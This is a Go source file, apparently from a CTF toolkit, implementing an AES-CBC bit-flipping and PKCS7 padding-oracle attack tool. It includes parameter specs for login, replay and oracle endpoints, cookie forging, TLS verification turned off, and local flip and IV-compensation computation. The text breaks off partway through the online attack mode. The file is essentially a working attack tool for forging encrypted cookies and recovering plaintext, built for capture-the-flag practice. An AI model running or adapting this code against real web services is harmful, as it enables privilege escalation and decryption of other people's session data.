// crypto.aes_cbc_bitflip —— AES-CBC 字节翻转攻击 / Padding Oracle 通用工具。
// 对应 legacy/tools/crypto/aes_cbc_bitflip.py，行为逐行对齐。
//
// 块长固定 16（AES-128/192/256 的 CBC 翻转与 Padding Oracle 数学完全相同）。
// 三种模式：flip（本地计算，含泄露补偿）/ attack（在线翻转+泄露级联补偿）/
// oracle（PKCS7 Padding Oracle 全明文恢复，含末字节误报排除）。
package crypto

import (
	"bytes"
	"context"
	"crypto/tls"
	"encoding/base64"
	"encoding/hex"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"time"
	"unicode/utf8"

	"ctfnet/internal/core"
)

const cbcBlock = 16

var (
	cbcDefaultLeakRe    = `base64_decode\('([A-Za-z0-9+/=]+)'\)`
	cbcDefaultSuccessRe = `flag\{[^}]+\}`
	cbcEncs             = []string{"auto", "base64", "hex", "raw"}
)

// valueError 对应 Python ValueError（run() 里走 "[错误]" 分支）。
type valueError struct{ msg string }

func (e *valueError) Error() string { return e.msg }

func verrf(format string, args ...any) error {
	return &valueError{msg: fmt.Sprintf(format, args...)}
}

// httpStatusError 对应 urllib.error.HTTPError（>=400）。
type httpStatusError struct {
	code int
	body string
}

func (e *httpStatusError) Error() string { return fmt.Sprintf("HTTP Error %d", e.code) }

// pyErrName 把 Go 错误映射回 Python 异常类名（报告行 "[中止] {Type}: {err}" 用）。
func pyErrName(err error) string {
	var se *httpStatusError
	if errors.As(err, &se) {
		return "HTTPError"
	}
	var ue *url.Error
	if errors.As(err, &ue) {
		if ne, ok := ue.Err.(net.Error); ok && ne.Timeout() {
			return "TimeoutError"
		}
		return "URLError"
	}
	var ne net.Error
	if errors.As(err, &ne) && ne.Timeout() {
		return "TimeoutError"
	}
	var oe *net.OpError
	if errors.As(err, &oe) {
		return "ConnectionError"
	}
	return "OSError"
}

// ---------------------------------------------------------------------------
// 小工具函数
// ---------------------------------------------------------------------------

func init() {
	core.DefaultRegistry.Register(&AesCbcBitflipTool{BaseTool: core.BaseTool{
		NameAttr:     "aes_cbc_bitflip",
		CategoryAttr: core.CatCrypto,
		VersionAttr:  "1.1.0",
		TimeoutAttr:  900,
		DescriptionAttr: "AES-CBC 字节翻转攻击通用工具：本地计算翻转密文/IV（含泄露补偿）、" +
			"在线翻转+泄露级联补偿攻击（iv/cipher 可来自 Cookie 或响应体）、" +
			"PKCS7 Padding Oracle 全明文恢复。",
		ParamsAttr: []core.ParamSpec{
			{Name: "mode", Type: "str", Required: false, Default: "flip",
				Description: "flip=本地计算 / attack=在线翻转+泄露补偿 / oracle=Padding Oracle 恢复明文"},
			{Name: "plaintext", Type: "text", Required: false, Default: "",
				Description: "加密前的完整已知明文（模板），工具在其中定位原片段"},
			{Name: "orig", Type: "str", Required: false, Default: "",
				Description: "要替换的原片段（如 aaaaa）"},
			{Name: "target", Type: "str", Required: false, Default: "",
				Description: "目标片段，必须与原片段等长（如 admin）"},
			{Name: "encoding", Type: "str", Required: false, Default: "ascii",
				Description: "明文字节编码：ascii / latin-1 / utf-8"},
			{Name: "cipher_b64", Type: "text", Required: false, Default: "",
				Description: "密文（base64/hex/raw，按 input_encoding；iv_in_cipher 时为 iv‖ct）"},
			{Name: "iv_b64", Type: "text", Required: false, Default: "",
				Description: "独立 IV 16 字节（可选；iv_in_cipher 时忽略）"},
			{Name: "leaked_b64", Type: "text", Required: false, Default: "",
				Description: "首次翻转后服务器泄露的解密明文（flip 模式补偿用）"},
			{Name: "input_encoding", Type: "str", Required: false, Default: "auto",
				Description: "输入材料（cipher/iv/leaked/target）编码：auto / base64 / hex / raw"},
			{Name: "iv_in_cipher", Type: "bool", Required: false, Default: false,
				Description: "密文值本身 = iv‖ct（前 16 字节为 IV），无需独立 IV 字段"},
			{Name: "login_url", Type: "str", Required: false, Default: "",
				Description: "登录端点（拿 iv/cipher；无独立重放端点时也在此重放）"},
			{Name: "login_method", Type: "str", Required: false, Default: "POST",
				Description: "登录请求方法 POST/GET"},
			{Name: "login_params", Type: "text", Required: false, Default: "",
				Description: "登录参数，格式 a=1&b=2（POST 为表单，GET 为查询串）"},
			{Name: "replay_url", Type: "str", Required: false, Default: "",
				Description: "重放端点，留空与 login_url 相同"},
			{Name: "replay_method", Type: "str", Required: false, Default: "GET",
				Description: "重放校验请求方法"},
			{Name: "replay_params", Type: "text", Required: false, Default: "",
				Description: "重放附加参数，支持 {iv}/{cipher} 占位符（走表单/查询串）；" +
					"无占位符时值走 Cookie 名"},
			{Name: "session_cookie", Type: "str", Required: false, Default: "PHPSESSID",
				Description: "会话 Cookie 名；留空则不携带会话 Cookie"},
			{Name: "iv_cookie", Type: "str", Required: false, Default: "iv",
				Description: "IV Cookie 名（source_type=cookie 时使用）"},
			{Name: "cipher_cookie", Type: "str", Required: false, Default: "cipher",
				Description: "密文 Cookie 名（source_type=cookie 时使用）"},
			{Name: "source_type", Type: "str", Required: false, Default: "cookie",
				Description: "iv/cipher 来源：cookie=Set-Cookie / body=登录响应体正则捕获 / manual=手动填写"},
			{Name: "iv_body_regex", Type: "text", Required: false, Default: "",
				Description: "source_type=body 时从登录响应捕获 IV 的正则（捕获组 1）"},
			{Name: "cipher_body_regex", Type: "text", Required: false, Default: "",
				Description: "source_type=body 时从登录响应捕获密文的正则（捕获组 1）"},
			{Name: "manual_iv", Type: "text", Required: false, Default: "",
				Description: "source_type=manual 时手动填写的 IV 值（按 value_encoding 解析；iv_in_cipher 时忽略）"},
			{Name: "manual_cipher", Type: "text", Required: false, Default: "",
				Description: "source_type=manual 时手动填写的密文值（按 value_encoding 解析；iv_in_cipher 时为 iv‖ct）"},
			{Name: "value_encoding", Type: "str", Required: false, Default: "auto",
				Description: "捕获与重放的 iv/cipher 值编码：auto / base64 / hex / raw"},
			{Name: "extra_cookies", Type: "text", Required: false, Default: "",
				Description: "每次请求追加的 Cookie（a=1&b=2），支持 {iv}/{cipher} 占位符"},
			{Name: "leak_regex", Type: "text", Required: false, Default: cbcDefaultLeakRe,
				Description: "泄露解密明文的正则（捕获组 1），如 14607 的 die(base64_encode) 格式"},
			{Name: "leak_encoding", Type: "str", Required: false, Default: "base64",
				Description: "泄露值编码：base64 / hex / raw"},
			{Name: "success_regex", Type: "text", Required: false, Default: cbcDefaultSuccessRe,
				Description: "成功标志正则，重放后在其中匹配 flag 等"},
			{Name: "interval", Type: "float", Required: false, Default: 0,
				Description: "请求间隔（秒），目标有限速时设置（attack/oracle）"},
			{Name: "retries", Type: "int", Required: false, Default: 3,
				Description: "瞬时错误（连接失败/未解析到泄露）自动重试次数，指数退避（attack/oracle）"},
			{Name: "oracle_url", Type: "str", Required: false, Default: "",
				Description: "Padding Oracle 端点（有效/无效填充响应有差异）"},
			{Name: "oracle_method", Type: "str", Required: false, Default: "GET",
				Description: "Oracle 请求方法 GET/POST"},
			{Name: "oracle_params", Type: "text", Required: false, Default: "",
				Description: "Oracle 请求参数，{payload} 占位符替换为构造的 iv′‖C 值（如 token={payload}）"},
			{Name: "oracle_cookie", Type: "str", Required: false, Default: "",
				Description: "把 payload 放进这个 Cookie（与 oracle_params 可同时用）"},
			{Name: "oracle_ok_regex", Type: "text", Required: false, Default: "",
				Description: "响应匹配此正则 = 填充有效（与 oracle_ok_status 为 AND 关系）"},
			{Name: "oracle_ok_status", Type: "int", Required: false, Default: 0,
				Description: "HTTP 状态码命中 = 填充有效（0=不按状态码判定）"},
			{Name: "oracle_invert", Type: "bool", Required: false, Default: false,
				Description: "反转判定：匹配/命中 = 填充无效"},
			{Name: "target_cipher", Type: "text", Required: false, Default: "",
				Description: "oracle 模式要恢复的密文；留空用 cipher_b64"},
		},
		Runner: aesCbcRun,
	}})
}

// AesCbcBitflipTool AES-CBC 字节翻转工具。
type AesCbcBitflipTool struct {
	core.BaseTool
}

// ValidateParams 对应 Python validate_params：全量填默认值 + 模式相关校验。
func (t *AesCbcBitflipTool) ValidateParams(params map[string]any) (map[string]any, error) {
	p, err := t.BaseTool.ValidateParams(params)
	if err != nil {
		return nil, err
	}
	mode := paramStr(p, "mode")
	if mode != "flip" && mode != "attack" && mode != "oracle" {
		return nil, verrf("未知模式: %s（flip / attack / oracle）", mode)
	}
	if !containsCBC(cbcEncs, paramStr(p, "input_encoding")) || !containsCBC(cbcEncs, paramStr(p, "value_encoding")) {
		return nil, verrf("编码必须是 %v 之一", cbcEncs)
	}
	if le := paramStr(p, "leak_encoding"); le != "base64" && le != "hex" && le != "raw" {
		return nil, verrf("leak_encoding 必须是 base64/hex/raw")
	}
	if mode == "flip" || mode == "attack" {
		if paramStr(p, "plaintext") == "" {
			return nil, verrf("flip/attack 模式必须提供已知明文 plaintext")
		}
		if paramStr(p, "orig") == "" || paramStr(p, "target") == "" {
			return nil, verrf("必须提供原片段 orig 与目标片段 target")
		}
		if len([]rune(paramStr(p, "orig"))) != len([]rune(paramStr(p, "target"))) {
			return nil, verrf("原片段与目标片段必须等长（%d != %d）；CBC 翻转不能改变长度字段，如 'aaaaa' → 'admin'",
				len([]rune(paramStr(p, "orig"))), len([]rune(paramStr(p, "target"))))
		}
	}
	if mode == "attack" {
		st := paramStr(p, "source_type")
		if st != "cookie" && st != "body" && st != "manual" {
			return nil, verrf("source_type 必须是 cookie / body / manual")
		}
		if st == "manual" {
			if paramStr(p, "manual_cipher") == "" {
				return nil, verrf("source_type=manual 时必须提供 manual_cipher")
			}
			if !paramBool(p, "iv_in_cipher") && paramStr(p, "manual_iv") == "" {
				return nil, verrf("source_type=manual 且未勾选 iv_in_cipher 时必须提供 manual_iv")
			}
			if paramStr(p, "login_url") == "" && paramStr(p, "replay_url") == "" {
				return nil, verrf("source_type=manual 时必须提供 replay_url 或 login_url 作为重放端点")
			}
		} else {
			if paramStr(p, "login_url") == "" {
				return nil, verrf("attack 模式必须提供登录端点 login_url（source_type=manual 时改为填写 manual_iv/manual_cipher）")
			}
			if st == "body" {
				if paramStr(p, "cipher_body_regex") == "" {
					return nil, verrf("source_type=body 时必须提供 cipher_body_regex")
				}
				if !paramBool(p, "iv_in_cipher") && paramStr(p, "iv_body_regex") == "" {
					return nil, verrf("source_type=body 且未勾选 iv_in_cipher 时必须提供 iv_body_regex")
				}
			}
		}
	}
	if mode == "oracle" {
		if paramStr(p, "oracle_url") == "" {
			return nil, verrf("oracle 模式必须提供 oracle_url")
		}
		if paramStr(p, "oracle_ok_regex") == "" && paramInt(p, "oracle_ok_status") == 0 {
			return nil, verrf("oracle 模式必须提供 oracle_ok_regex 或 oracle_ok_status")
		}
		if paramStr(p, "target_cipher") == "" && paramStr(p, "cipher_b64") == "" {
			return nil, verrf("oracle 模式必须提供 target_cipher（或 cipher_b64）")
		}
	}
	return p, nil
}

// ---------------------------------------------------------------------------
// 材料编解码
// ---------------------------------------------------------------------------

// pyUnquote 等价 urllib.parse.unquote（%XX 解码，无效转义保留，+ 不变）。
func pyUnquote(s string) string {
	var b strings.Builder
	for i := 0; i < len(s); i++ {
		if s[i] == '%' && i+2 <= len(s) {
			if v, err := strconv.ParseUint(s[i+1:i+3], 16, 8); err == nil {
				b.WriteByte(byte(v))
				i += 2
				continue
			}
		}
		b.WriteByte(s[i])
	}
	return b.String()
}

// b64d 宽松 base64 解码：容忍 URL 编码、缺 padding。
func b64d(s string) ([]byte, error) {
	s = pyUnquote(strings.TrimSpace(s))
	s += strings.Repeat("=", (4-len(s)%4)%4)
	// Python b64decode 忽略字母表外字符
	var clean strings.Builder
	for _, ch := range s {
		if (ch >= 'A' && ch <= 'Z') || (ch >= 'a' && ch <= 'z') ||
			(ch >= '0' && ch <= '9') || ch == '+' || ch == '/' || ch == '=' {
			clean.WriteRune(ch)
		}
	}
	return base64.StdEncoding.DecodeString(clean.String())
}

// hexDecodeLenient 等价 bytes.fromhex（忽略 ASCII 空白）。
func hexDecodeLenient(s string) ([]byte, error) {
	var clean strings.Builder
	for _, ch := range s {
		switch ch {
		case ' ', '\t', '\n', '\r', '\v', '\f':
		default:
			clean.WriteRune(ch)
		}
	}
	return hex.DecodeString(clean.String())
}

// latin1Encode 等价 str.encode("latin-1")。
func latin1Encode(s string) ([]byte, error) {
	b := make([]byte, 0, len(s))
	for _, r := range s {
		if r > 0xFF {
			return nil, verrf("raw 解码失败: %q 超出 latin-1 范围", string(r))
		}
		b = append(b, byte(r))
	}
	return b, nil
}

// latin1String 等价 bytes.decode("latin-1")。
func latin1String(b []byte) string {
	rs := make([]rune, len(b))
	for i, c := range b {
		rs[i] = rune(c)
	}
	return string(rs)
}

// decodeMaterial 解码用户提供的密文/IV/泄露材料。auto = 先 base64 后 hex 探测。
func decodeMaterial(s, enc string) ([]byte, error) {
	s = strings.TrimSpace(s)
	if s == "" {
		return nil, verrf("材料为空")
	}
	switch enc {
	case "base64":
		b, err := b64d(s)
		if err != nil {
			return nil, verrf("base64 解码失败: %v", err)
		}
		return b, nil
	case "hex":
		b, err := hexDecodeLenient(s)
		if err != nil {
			return nil, verrf("hex 解码失败: %v", err)
		}
		return b, nil
	case "raw":
		return latin1Encode(s)
	default: // auto：先 base64，失败再 hex
		if b, err := b64d(s); err == nil {
			return b, nil
		}
		if b, err := hexDecodeLenient(s); err == nil {
			return b, nil
		}
		_, hexErr := hexDecodeLenient(s)
		return nil, verrf("材料既不是合法 base64 也不是 hex: %v", hexErr)
	}
}

func encodeMaterial(b []byte, enc string) string {
	switch enc {
	case "hex":
		return hex.EncodeToString(b)
	case "raw":
		return latin1String(b)
	default: // auto → base64
		return base64.StdEncoding.EncodeToString(b)
	}
}

func cbcOutLabel(enc string) string {
	if enc == "auto" || enc == "base64" {
		return "base64"
	}
	return enc
}

func cbcEncName(name string) string {
	switch name {
	case "ascii", "latin-1", "utf-8":
		return name
	}
	return "ascii"
}

func cbcEncodeText(s, enc string) ([]byte, error) {
	switch enc {
	case "ascii":
		b := make([]byte, 0, len(s))
		for _, r := range s {
			if r > 0x7F {
				return nil, verrf("明文无法用 ascii 编码: %q", string(r))
			}
			b = append(b, byte(r))
		}
		return b, nil
	case "latin-1":
		b := make([]byte, 0, len(s))
		for _, r := range s {
			if r > 0xFF {
				return nil, verrf("明文无法用 latin-1 编码: %q", string(r))
			}
			b = append(b, byte(r))
		}
		return b, nil
	default:
		return []byte(s), nil
	}
}

// pyBytesRepr 等价 Python bytes.__repr__（b'...'，非可打印转 \xHH）。
func pyBytesRepr(b []byte) string {
	var s strings.Builder
	s.WriteString("b'")
	for _, c := range b {
		switch {
		case c == '\\':
			s.WriteString(`\\`)
		case c == '\'':
			s.WriteString(`\'`)
		case c == '\t':
			s.WriteString(`\t`)
		case c == '\n':
			s.WriteString(`\n`)
		case c == '\r':
			s.WriteString(`\r`)
		case c >= 0x20 && c <= 0x7E:
			s.WriteByte(c)
		default:
			fmt.Fprintf(&s, `\x%02x`, c)
		}
	}
	s.WriteString("'")
	return s.String()
}

// pyChrRepr 等价 Python 单字符 str repr。
func pyChrRepr(r rune) string {
	return fmt.Sprintf("%q", string(r))
}

func pyIntListRepr(list []int) string {
	parts := make([]string, len(list))
	for i, v := range list {
		parts[i] = strconv.Itoa(v)
	}
	return "[" + strings.Join(parts, ", ") + "]"
}

func pyStrListRepr(list []string) string {
	parts := make([]string, len(list))
	for i, v := range list {
		parts[i] = "'" + v + "'"
	}
	return "[" + strings.Join(parts, ", ") + "]"
}

// pyQuote 等价 urllib.parse.quote(s, safe=”)（Cookie/base64 值必须全转义）。
func pyQuote(s string) string {
	return url.QueryEscape(s)
}

func excerpt(text string, n int) string {
	t := strings.Join(strings.Fields(text), " ")
	r := []rune(t)
	if len(r) > n {
		return string(r[:n]) + "…"
	}
	return t
}

// ---------------------------------------------------------------------------
// HTTP 通道
// ---------------------------------------------------------------------------

func cbcClient() *http.Client {
	return &http.Client{
		Timeout: 15 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
}

// parseCBCPairs 等价 urllib.parse.parse_qsl(keep_blank_values=True)。
func parseCBCPairs(s string) [][2]string {
	var out [][2]string
	if s == "" {
		return out
	}
	for _, part := range strings.Split(s, "&") {
		var k, v string
		if i := strings.Index(part, "="); i >= 0 {
			k, v = part[:i], part[i+1:]
		} else {
			k = part
		}
		if u, err := url.QueryUnescape(k); err == nil {
			k = u
		}
		if u, err := url.QueryUnescape(v); err == nil {
			v = u
		}
		out = append(out, [2]string{k, v})
	}
	return out
}

// buildQS 等价 urlencode(parse_qsl(pairs))：保序、空格→+、保空值。
func buildQS(pairs string) string {
	ps := parseCBCPairs(pairs)
	parts := make([]string, 0, len(ps))
	for _, p := range ps {
		parts = append(parts, url.QueryEscape(p[0])+"="+url.QueryEscape(p[1]))
	}
	return strings.Join(parts, "&")
}

// parseSetCookies 解析 Set-Cookie 头（值 urldecode 还原，PHP setcookie 会编码）。
// Go 可能把多条 Set-Cookie 合并进一个值，按逗号再拆（cookie 值不含逗号，安全）。
func parseSetCookies(h http.Header) [][2]string {
	var out [][2]string
	for _, v := range h.Values("Set-Cookie") {
		for _, piece := range strings.Split(v, ",") {
			part := strings.SplitN(piece, ";", 2)[0]
			if !strings.Contains(part, "=") {
				continue
			}
			kv := strings.SplitN(part, "=", 2)
			out = append(out, [2]string{
				strings.TrimSpace(kv[0]), pyUnquote(strings.TrimSpace(kv[1])),
			})
		}
	}
	return out
}

// cookieKeys 有序去重的 cookie 名列表（等价 Python dict 键序）。
func cookieKeys(pairs [][2]string) []string {
	var out []string
	seen := map[string]bool{}
	for _, p := range pairs {
		if !seen[p[0]] {
			seen[p[0]] = true
			out = append(out, p[0])
		}
	}
	return out
}

// lastCookie 取最后一次出现的值（等价 Python dict 覆盖语义）。
func lastCookie(pairs [][2]string, key string) (string, bool) {
	for i := len(pairs) - 1; i >= 0; i-- {
		if pairs[i][0] == key {
			return pairs[i][1], true
		}
	}
	return "", false
}

func cookieHeaderStr(cookies [][2]string) string {
	parts := make([]string, 0, len(cookies))
	for _, c := range cookies {
		parts = append(parts, c[0]+"="+pyQuote(c[1]))
	}
	return strings.Join(parts, "; ")
}

// cbcRequestRaw 对应 Python _request 的网络层。
func cbcRequestRaw(client *http.Client, urlStr, method, pairs string, cookies [][2]string) (int, string, [][2]string, error) {
	qs := buildQS(pairs)
	m := strings.ToUpper(method)
	target := urlStr
	var body io.Reader
	if m == "GET" {
		if qs != "" {
			if strings.Contains(target, "?") {
				target += "&" + qs
			} else {
				target += "?" + qs
			}
		}
	} else if qs != "" {
		body = strings.NewReader(qs)
	}
	req, err := http.NewRequest(m, target, body)
	if err != nil {
		return 0, "", nil, err
	}
	if body != nil {
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	}
	if len(cookies) > 0 {
		req.Header.Set("Cookie", cookieHeaderStr(cookies))
	}
	resp, err := client.Do(req)
	if err != nil {
		return 0, "", nil, err
	}
	defer resp.Body.Close()
	data, err := io.ReadAll(resp.Body)
	if err != nil {
		return 0, "", nil, err
	}
	bodyStr := strings.ToValidUTF8(string(data), "�")
	return resp.StatusCode, bodyStr, parseSetCookies(resp.Header), nil
}

// cbcRequest 对应 Python _request：>=400 抛 HTTPError。
func cbcRequest(client *http.Client, urlStr, method, pairs string, cookies [][2]string) (int, string, [][2]string, error) {
	st, b, ck, err := cbcRequestRaw(client, urlStr, method, pairs, cookies)
	if err != nil {
		return 0, "", nil, err
	}
	if st >= 400 {
		return 0, "", nil, &httpStatusError{code: st, body: b}
	}
	return st, b, ck, nil
}

// cbcRequestNoraise 对应 Python _request_noraise：4xx/5xx 也作为响应返回。
func cbcRequestNoraise(client *http.Client, urlStr, method, pairs string, cookies [][2]string) (int, string, error) {
	st, b, _, err := cbcRequestRaw(client, urlStr, method, pairs, cookies)
	return st, b, err
}

func paramBool(p map[string]any, key string) bool {
	v, _ := p[key].(bool)
	return v
}

func paramInt(p map[string]any, key string) int {
	switch v := p[key].(type) {
	case float64:
		return int(v)
	case int:
		return v
	case string:
		if n, err := strconv.Atoi(v); err == nil {
			return n
		}
	}
	return 0
}

func paramFloat(p map[string]any, key string) float64 {
	switch v := p[key].(type) {
	case float64:
		return v
	case int:
		return float64(v)
	case string:
		if f, err := strconv.ParseFloat(v, 64); err == nil {
			return f
		}
	}
	return 0
}

func containsCBC(list []string, s string) bool {
	for _, x := range list {
		if x == s {
			return true
		}
	}
	return false
}

func utf8Valid(b []byte) bool {
	return utf8.Valid(b)
}

func containsInt(list []int, v int) bool {
	for _, x := range list {
		if x == v {
			return true
		}
	}
	return false
}

// ---------------------------------------------------------------------------
// 核心计算：定位 + Δ 分段 + 期望明文
// ---------------------------------------------------------------------------

type flipSeg struct {
	j, o, d, ob, tb int
}

func cbcLocate(params map[string]any, report *[]string) (pp, dd []byte, segs []flipSeg, changed, corrupted []int, nb int, err error) {
	enc := cbcEncName(paramStr(params, "encoding"))
	plain, err := cbcEncodeText(paramStr(params, "plaintext"), enc)
	if err != nil {
		return
	}
	orig, err := cbcEncodeText(paramStr(params, "orig"), enc)
	if err != nil {
		return
	}
	target, err := cbcEncodeText(paramStr(params, "target"), enc)
	if err != nil {
		return
	}
	if len(orig) != len(target) {
		err = verrf("原片段与目标片段编码后字节数不等（%d != %d）；CBC 翻转只能等长替换，如 'aaaaa' → 'admin'", len(orig), len(target))
		return
	}
	pos := bytes.Index(plain, orig)
	if pos < 0 {
		err = verrf("在已知明文里找不到原片段 %s；请确认明文模板与服务器加密前的内容一致（含序列化/JSON 结构）", pyBytesRepr(orig))
		return
	}
	cnt := bytes.Count(plain, orig)
	if cnt > 1 {
		*report = append(*report, fmt.Sprintf("[定位] 原片段出现 %d 次，取第 1 处", cnt))
	}
	*report = append(*report, fmt.Sprintf("[定位] 片段 %s → %s，明文字节 %d~%d",
		pyBytesRepr(orig), pyBytesRepr(target), pos, pos+len(orig)-1))

	// 期望明文 = 原明文把目标片段逐字节替换
	desired := bytes.Clone(plain)
	for i := range orig {
		d := orig[i] ^ target[i]
		if d != 0 {
			desired[pos+i] ^= d
			segs = append(segs, flipSeg{(pos + i) / cbcBlock, (pos + i) % cbcBlock, int(d), int(orig[i]), int(target[i])})
		}
	}
	if len(segs) == 0 {
		err = verrf("原片段与目标片段完全相同，没有需要翻转的字节")
		return
	}

	nb = (len(plain) + cbcBlock - 1) / cbcBlock
	padded := nb * cbcBlock
	pp = make([]byte, padded)
	copy(pp, plain)
	dd = make([]byte, padded)
	copy(dd, desired)

	seen := map[int]bool{}
	for _, s := range segs {
		seen[s.j] = true
	}
	for j := range seen {
		changed = append(changed, j)
	}
	sort.Ints(changed)
	seen2 := map[int]bool{}
	for _, j := range changed {
		if j >= 1 {
			seen2[j-1] = true
		}
	}
	for c := range seen2 {
		corrupted = append(corrupted, c)
	}
	sort.Sort(sort.Reverse(sort.IntSlice(corrupted)))
	return
}

func cbcDescribeFlip(segs []flipSeg, report *[]string) {
	for _, s := range segs {
		name := fmt.Sprintf("C[%d]", s.j-1)
		if s.j == 0 {
			name = "IV"
		}
		*report = append(*report, fmt.Sprintf("[翻转] %s[%2d] ^= %#04x（明文字节 %d: %#04x %s → %#04x %s）",
			name, s.o, s.d, s.j*cbcBlock+s.o, s.ob, pyChrRepr(rune(s.ob)), s.tb, pyChrRepr(rune(s.tb))))
	}
}

func intStrs(list []int) []string {
	out := make([]string, len(list))
	for i, v := range list {
		out[i] = strconv.Itoa(v)
	}
	return out
}

// ---------------------------------------------------------------------------
// flip 模式：本地计算
// ---------------------------------------------------------------------------

func cbcRunFlip(params map[string]any, report *[]string) error {
	_, dd, segs, changed, corrupted, nb, err := cbcLocate(params, report)
	if err != nil {
		return err
	}
	*report = append(*report, fmt.Sprintf("[明文] %d 块（每块 16 字节），目标块: %s", nb, strings.Join(intStrs(changed), ", ")))
	cbcDescribeFlip(segs, report)

	if len(corrupted) > 0 {
		names := make([]string, len(corrupted))
		for i, c := range corrupted {
			names[i] = fmt.Sprintf("块 %d", c)
		}
		*report = append(*report, fmt.Sprintf("[警告] 翻转 C[j-1] 会连带把块 j-1 整体破坏（D 值雪崩）：受影响的块 = %s；块 0 可用 IV 补偿，块 ≥1 需要泄露明文逐级补偿（attack 模式）或先用 oracle 模式恢复明文", strings.Join(names, ", ")))
	} else {
		*report = append(*report, "[结果] 目标全部位于块 0：直接改 IV 即可，无块被连带破坏，无需补偿")
	}

	ie := paramStr(params, "input_encoding")
	ol := cbcOutLabel(ie)
	inCipher := paramBool(params, "iv_in_cipher")

	// —— 材料解码 ——
	var raw, cb, ivb []byte
	if paramStr(params, "cipher_b64") != "" {
		raw, err = decodeMaterial(paramStr(params, "cipher_b64"), ie)
		if err != nil {
			return err
		}
		if inCipher {
			if len(raw) < cbcBlock+nb*cbcBlock {
				return verrf("密文（iv‖ct）仅 %d 字节，不足以覆盖 %d 块明文", len(raw), nb)
			}
			ivb, cb = raw[:cbcBlock], raw[cbcBlock:]
		} else {
			if len(raw) < nb*cbcBlock {
				return verrf("密文仅 %d 字节，不足以覆盖 %d 块明文", len(raw), nb)
			}
			cb = raw
		}
	}
	if ivb == nil && paramStr(params, "iv_b64") != "" {
		ivb, err = decodeMaterial(paramStr(params, "iv_b64"), ie)
		if err != nil {
			return err
		}
		if len(ivb) != cbcBlock {
			return verrf("IV 必须 16 字节（现 %d）", len(ivb))
		}
	}

	// —— 应用翻转（j>=1 翻密文，j==0 翻 IV）——
	for _, s := range segs {
		if s.j >= 1 && cb != nil {
			cb[(s.j-1)*cbcBlock+s.o] ^= byte(s.d)
		}
		if s.j == 0 && ivb != nil {
			ivb[s.o] ^= byte(s.d)
		}
	}
	if ivb != nil && containsInt(changed, 0) {
		if inCipher {
			*report = append(*report, "[IV] 块 0 翻转已并入 iv‖ct 前 16 字节（见下方密文输出）")
		} else {
			*report = append(*report, fmt.Sprintf("[IV] 块 0 直接翻转后的 iv（%s）: %s", ol, encodeMaterial(ivb, ie)))
		}
	}

	// —— 输出翻转后密文 ——
	if cb != nil {
		if inCipher {
			combined := append(append([]byte{}, ivb...), cb...)
			*report = append(*report, fmt.Sprintf("[密文] 翻转后 iv‖ct（%s）: %s", ol, encodeMaterial(combined, ie)))
		} else {
			*report = append(*report, fmt.Sprintf("[密文] 翻转后 cipher（%s）: %s", ol, encodeMaterial(cb, ie)))
		}
	}

	// —— 泄露补偿（修复块 0）——
	var leaked []byte
	if paramStr(params, "leaked_b64") != "" {
		leaked, err = decodeMaterial(paramStr(params, "leaked_b64"), ie)
		if err != nil {
			return err
		}
	}

	if leaked != nil && ivb != nil {
		if len(corrupted) > 0 && !(len(corrupted) == 1 && corrupted[0] == 0) {
			*report = append(*report, fmt.Sprintf("[补偿] 泄露明文已提供，但被破坏的块为 %s（不止块 0），每修复一个块都会产生新的垃圾块，需要每次泄露——请改用 attack 模式在线完成", pyIntListRepr(corrupted)))
		} else if len(corrupted) == 1 && corrupted[0] == 0 {
			g0 := leaked
			if len(g0) > cbcBlock {
				g0 = g0[:cbcBlock]
			}
			want := dd
			if len(want) > cbcBlock {
				want = want[:cbcBlock]
			}
			n := len(ivb)
			if len(g0) < n {
				n = len(g0)
			}
			if len(want) < n {
				n = len(want)
			}
			ivNew := make([]byte, n)
			for i := 0; i < n; i++ {
				ivNew[i] = ivb[i] ^ g0[i] ^ want[i]
			}
			*report = append(*report, fmt.Sprintf("[补偿] 块 0 垃圾 = %s", pyBytesRepr(g0)))
			*report = append(*report, fmt.Sprintf("[补偿] IV_new = IV ^ 垃圾 ^ 期望前缀 = %s（与翻转后密文搭配重放即可）", encodeMaterial(ivNew, ie)))
			if cb != nil {
				*report = append(*report, "[重放] 最终 Cookie（可直接复制）:")
				if inCipher {
					combined := append(append([]byte{}, ivNew...), cb...)
					*report = append(*report, "  └─ cipher="+pyQuote(encodeMaterial(combined, ie)))
				} else {
					*report = append(*report, fmt.Sprintf("  └─ iv=%s; cipher=%s", pyQuote(encodeMaterial(ivNew, ie)), pyQuote(encodeMaterial(cb, ie))))
				}
			}
		}
	} else if len(corrupted) == 1 && corrupted[0] == 0 && cb != nil {
		if ivb == nil {
			*report = append(*report, "[提示] 块 0 被破坏但未提供 IV 与泄露明文，无法计算补偿；提供 iv_b64 + leaked_b64，或改用 attack 模式")
		} else {
			*report = append(*report, "[提示] 块 0 被破坏但未提供泄露明文，无法计算补偿 IV；提供 leaked_b64，或改用 attack/oracle 模式")
		}
	}
	return nil
}

// ---------------------------------------------------------------------------
// attack 模式：在线翻转 + 泄露级联补偿
// ---------------------------------------------------------------------------

func cbcRunAttack(ctx context.Context, params map[string]any, report *[]string) error {
	_ = ctx
	interval := paramFloat(params, "interval")
	retries := paramInt(params, "retries")
	if retries < 1 {
		retries = 1
	}
	urlRaw := strings.TrimRight(paramStr(params, "login_url"), "/")
	replayURL := strings.TrimRight(paramStr(params, "replay_url"), "/")
	if replayURL == "" {
		replayURL = urlRaw
	}
	ve := paramStr(params, "value_encoding")
	inCipher := paramBool(params, "iv_in_cipher")
	client := cbcClient()

	// 瞬时错误（5xx / 连接失败）指数退避重试；4xx 直接抛
	reqRetry := func(label, url, method, pairs string, cookies [][2]string) (int, string, [][2]string, error) {
		var lastErr error
		for attempt := 0; attempt < retries; attempt++ {
			st, b, setck, err := cbcRequest(client, url, method, pairs, cookies)
			if err == nil {
				return st, b, setck, nil
			}
			var se *httpStatusError
			if errors.As(err, &se) && se.code < 500 {
				return 0, "", nil, err
			}
			lastErr = err
			if attempt+1 < retries {
				wait := 1 << attempt
				*report = append(*report, fmt.Sprintf("[重试] %s %s: %v（第 %d/%d 次失败），%ds 后重试",
					label, pyErrName(err), err, attempt+1, retries, wait))
				time.Sleep(time.Duration(wait) * time.Second)
			}
		}
		return 0, "", nil, lastErr
	}

